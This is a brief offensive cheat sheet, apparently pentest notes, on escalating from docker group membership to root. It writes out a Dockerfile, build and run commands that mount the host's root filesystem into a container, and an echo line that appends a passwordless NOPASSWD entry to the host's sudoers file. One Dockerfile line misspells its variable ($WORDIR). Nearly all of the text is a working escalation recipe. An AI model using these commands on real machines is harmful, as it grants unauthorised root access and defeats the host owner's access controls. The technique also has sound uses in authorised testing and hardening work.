Docker Privilege Escalation

[*] If the user has access to docker, you can create an image, then run a container with host file system as persistant storage.


[*] Dockerfile

        FROM debian:wheezy
        ENV WORKDIR /privesc
        RUN mkdir -p $WORDIR
        VOLUME [ $WORKDIR ]
        WORKDIR $WORKDIR

[*] Build The Image

        $ docker build -t image/privesc .

[*] Create the container
    
    $ docker run -v /:/privesc -it image/privesc /bin/bash

[*] Now that you are in the container, notice the host file system is mounted in /privesc/.
    Let's add ourselved to the sudoers file.

        echo "myusername ALL=(ALL) NOPASSWD: ALL" >> /privesc/etc/sudoers

    Exit your container and notice you have root privs on the host.

